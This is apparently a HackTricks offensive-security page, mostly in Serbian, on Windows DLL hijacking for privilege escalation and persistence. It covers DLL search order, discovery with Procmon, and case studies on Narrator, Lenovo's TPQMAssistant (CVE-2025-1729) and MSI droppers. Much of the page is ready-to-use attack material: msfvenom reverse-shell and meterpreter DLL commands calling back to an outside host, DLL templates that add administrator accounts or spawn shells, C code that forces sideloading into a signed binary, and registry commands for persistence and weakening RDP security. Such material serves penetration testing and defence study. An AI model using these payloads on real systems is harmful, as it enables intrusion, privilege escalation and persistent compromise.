# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju poverljivom aplikacijom da učita maliciozni DLL. Ovaj pojam obuhvata više taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Koristi se prvenstveno za izvršavanje koda, postizanje persistence, i, ređe, privilege escalation. Iako je ovde fokus na escalation, metod hijackinga ostaje isti bez obzira na cilj.

### Uobičajene tehnike

Koriste se različite metode za DLL hijacking, a njihova efektivnost zavisi od strategije aplikacije za učitavanje DLL-ova:

1. **DLL Replacement**: Zamena legitimnog DLL-a malicioznim, opcionalno koristeći DLL Proxying da se sačuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje malicioznog DLL-a u putanju pre legitimnog, iskorišćavajući pattern pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje malicioznog DLL-a koji će aplikacija pokušati da učita misleći da je u pitanju nepostojeći potreban DLL.
4. **DLL Redirection**: Izmena parametara pretrage poput %PATH% ili .exe.manifest / .exe.local fajlova da se aplikacija usmeri na maliciozni DLL.
5. **WinSxS DLL Replacement**: Zamenjivanje legitimnog DLL-a malicioznom verzijom u WinSxS direktorijumu, metoda često povezana sa DLL side-loading.
6. **Relative Path DLL Hijacking**: Postavljanje malicioznog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.

## Pronalaženje nedostajućih Dlls

Najčešći način da se pronađu nedostajući Dlls u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **podešavanjem** **sledeća 2 filtera**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i prikazivanjem samo **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **missing dlls in general**, ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **missing dll** unutar određenog izvršnog fajla, treba da postavite **drugi filter kao "Process Name" "contains" `<exec name>`, pokrenete ga, i zaustavite beleženje događaja**.

## Eksploatisanje nedostajućih Dlls

Da bismo eskalirali privilegije, najbolja šansa je moći da **upisemo DLL koji će neki privileged process pokušati da učita** u neko od **mesta gde će se tražiti**. Dakle, moći ćemo da **upisemo** DLL u **folder** gde će se DLL tražiti pre foldera gde je originalni DLL (retki slučaj), ili ćemo moći da **upisujemo u neki folder gde će se DLL tražiti**, a originalni **DLL ne postoji** u nijednom folderu.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows aplikacije traže DLL-ove prateći skup **preddefinisanih putanja pretrage**, u određenom redosledu. Problem DLL hijackinga nastaje kada se maliciozni DLL strateški postavi u jedan od tih direktorijuma, osiguravajući da bude učitan pre autentičnog DLL-a. Rešenje za ovo je osigurati da aplikacija koristi apsolutne putanje kada referencira potrebne DLL-ove.

Možete videti **DLL search order na 32-bit** sistemima ispod:

1. Direktorijum iz kojeg je aplikacija učitana.
2. Sistem direktorijum. Koristite [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) funkciju da dobijete putanju ovog direktorijuma.(_C:\Windows\System32_)
3. 16-bit system direktorijum. Ne postoji funkcija koja dobija putanju ovog direktorijuma, ali se pretražuje. (_C:\Windows\System_)
4. Windows direktorijum. Koristite [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) funkciju da dobijete putanju ovog direktorijuma.
1. (_C:\Windows_)
5. Trenutni direktorijum.
6. Direktorijumi koji su navedeni u PATH environment varijabli. Napomena: ovo ne uključuje per-application putanju specificiranu preko **App Paths** registry ključa. **App Paths** ključ se ne koristi pri računanju DLL search path-a.

To je **podrazumevani** redosled pretrage sa **SafeDllSearchMode** omogućenim. Kada je isključen, trenutni direktorijum prelazi na drugo mesto. Da biste onemogućili ovu opciju, kreirajte registry vrednost **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) funkcija pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji **LoadLibraryEx** učitava.

Na kraju, imajte na umu da **dll može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju taj dll će **biti tražen samo u toj putanji** (ako dll ima zavisnosti, one će se tražiti kao da su učitane po imenu).

Postoje i drugi načini da se izmeni redosled pretrage, ali ih ovde neću objašnjavati.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa je postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa koristeći ntdll-ove native API-je. Pružanjem direktorijuma pod kontrolom napadača ovde, ciljani proces koji rešava importovani DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flag-ova) može biti primoran da učita maliciozni DLL iz tog direktorijuma.

Ključna ideja
- Sastavite process parameters sa RtlCreateProcessParametersEx i obezbedite prilagođeni DllPath koji pokazuje na vaš kontrolisani folder (npr. direktorijum gde živi vaš dropper/unpacker).
- Kreirajte proces sa RtlCreateUserProcess. Kada ciljani binarni fajl reši DLL po imenu, loader će konsultovati ovaj obezbeđeni DllPath tokom rezolucije, omogućavajući pouzdano sideloading čak i kada maliciozni DLL nije ko-lociran sa ciljnim EXE-om.

Napomene/ograničenja
- Ovo utiče na child proces koji se kreira; različito je od SetDllDirectory, koja utiče samo na trenutni proces.
- Cilj mora importovati ili LoadLibrary DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu biti hijackovane. Forwarded exports i SxS mogu promeniti prioritet.

Minimalan C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Ova tehnika je primećena in-the-wild da pokreće multi-stage sideloading chains: inicijalni launcher ispusti pomoćni DLL, koji zatim pokreće Microsoft-signed, hijackable binarnu datoteku sa custom DllPath-om da bi prisilio učitavanje attacker-ovog DLL-a iz staging direktorijuma.


#### Izuzeci u redosledu pretrage DLL-ova iz Windows dokumentacije

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Eskalacija privilegija

**Zahtevi**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Da, zahtevi su komplikovani za naći jer je **po defaultu prilično čudno naći privilegovani izvršni fajl kojem nedostaje DLL** i još je **čudnije imati dozvole za pisanje u folderu sistemske putanje** (po defaultu to ne možete). Ali, u pogrešno konfigurisanom okruženju ovo je moguće.\
U slučaju da ste srećni i ispunjavate zahteve, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Čak iako je **glavni cilj projekta da bypass UAC**, možda ćete tamo naći **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole za sve foldere u PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršne datoteke i exports dll-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za potpuni vodič kako **abuse Dll Hijacking to escalate privileges** uz dozvole za pisanje u **System Path folder** pogledajte:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatizovani alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) will check if you have write permissions on any folder inside system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll_.

### Primer

Ako nađete eksploatabilan scenario, jedna od najvažnijih stvari za uspešnu eksploataciju biće da **create a dll that exports at least all the functions the executable will import from it**. U svakom slučaju, imajte na umu da Dll Hijacking dolazi u pomoć kako bi [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **how to create a valid dll** možete naći u ovoj dll hijacking studiji fokusiranoj na dll hijacking za izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Pored toga, u **sledećem odeljku** možete naći neke **basic dll codes** koji mogu biti korisni kao **templates** ili za kreiranje **dll with non required functions exported**.

## **Kreiranje i kompajliranje Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll koji može da izvrši vaš maliciozni kod kada se učita, ali i da se ponaša i radi kako se očekuje tako što prosleđuje sve pozive pravoj biblioteci.

Sa alatom [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo da navedete izvršni fajl i izaberete biblioteku koju želite proxify-ovati i generišete proxified dll, ili da navedete Dll i generišete proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Nabavite meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreirajte korisnika (x86 nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vlastiti

Obratite pažnju da u nekoliko slučajeva DLL koji kompajlirate mora **exportovati više funkcija** koje će proces žrtve učitati; ako te funkcije ne postoje, the **binary won't be able to load** them and the **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativni C DLL sa ulaznom funkcijom niti</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje traži predvidljivu, jezički specifičnu localization DLL pri pokretanju koja može biti hijacked za arbitrary code execution i persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC tišina
- Naivno hijackovanje će govoriti/istaknuti UI. Da biste ostali tihi, pri attach-u izlistajte Narrator niti, otvorite glavnu nit (`OpenThread(THREAD_SUSPEND_RESUME)`) i pozovite `SuspendThread` na njoj; nastavite u sopstvenoj niti. Pogledajte PoC za kompletan kod.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Sa navedenim podešavanjima, pokretanje Narrator učitava postavljeni DLL. Na sigurnom desktopu (ekran za prijavu), pritisnite CTRL+WIN+ENTER da pokrenete Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Povežite se preko RDP-a na host; na ekranu za prijavu pritisnite CTRL+WIN+ENTER da pokrenete Narrator; vaš DLL se izvršava kao SYSTEM na sigurnom desktopu.
- Izvršavanje prestaje kada se RDP sesija zatvori — inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Napomene
- Pisanje u `%windir%\System32` i menjanje HKLM vrednosti zahteva administratorska prava.
- Sva logika payload-a može biti u `DLL_PROCESS_ATTACH`; eksporti nisu potrebni.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj pokazuje **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu (`TPQMAssistant.exe`), praćen kao **CVE-2025-1729**.

### Detalji ranjivosti

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementacija exploita

Napadač može postaviti zlonamerni stub `hostfxr.dll` u isti direktorijum, iskorišćavajući nedostajući DLL da ostvari izvršavanje koda u kontekstu korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL će se pokrenuti u sesiji administratora sa srednjim integritetom.
4. Povežite standardne UAC bypass tehnike da biste podigli privilegije sa srednjeg integriteta na SYSTEM privilegije.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading preko potpisanog hosta (wsc_proxy.exe)

Napadači često kombinuju MSI-bazirane droppere sa DLL side-loading kako bi izvršili payload pod pouzdanim, potpisanim procesom.

Pregled lanca
- Korisnik preuzme MSI. CustomAction se tiho izvršava tokom GUI instalacije (npr. LaunchApplication ili VBScript akcija), rekonstruišući sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer para: Avast-potpisan wsc_proxy.exe + napadačem kontrolisan wsc.dll).
- Kada se potpisani EXE pokrene, Windows DLL search order učitava wsc.dll iz radnog direktorijuma prvi, izvršavajući kod napadača pod potpisanim roditeljem (ATT&CK T1574.001).

MSI analiza (na šta obratiti pažnju)
- CustomAction table:
- Potražite unose koji pokreću executables ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji izvršava ugrađeni fajl u pozadini.
- U Orca (Microsoft Orca.exe), proverite CustomAction, InstallExecuteSequence i Binary tabele.
- Ugnježdeni/podeljeni payloads u MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Potražite više malih fragmenata koji su spojeni i dekriptovani od strane VBScript CustomAction. Uobičajen tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktično sideloading pomoću wsc_proxy.exe
- Postavite ova dva fajla u isti folder:
- wsc_proxy.exe: legitiman potpisan host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: DLL napadača. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, izgradite proxy DLL i proslijedite potrebne exports originalnoj biblioteci dok pokrećete payload u DllMain.
- Sastavite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za eksport, koristite proxying framework (npr. DLLirant/Spartacus) da generišete prosleđujući DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na razrešavanje imena DLL-a od strane host binarija. Ako host koristi apsolutne puteve ili safe loading flags (npr. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack možda neće uspeti.
- KnownDLLs, SxS i forwarded exports mogu uticati na prioritet i moraju se uzeti u obzir pri izboru host binarija i skupa exporta.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
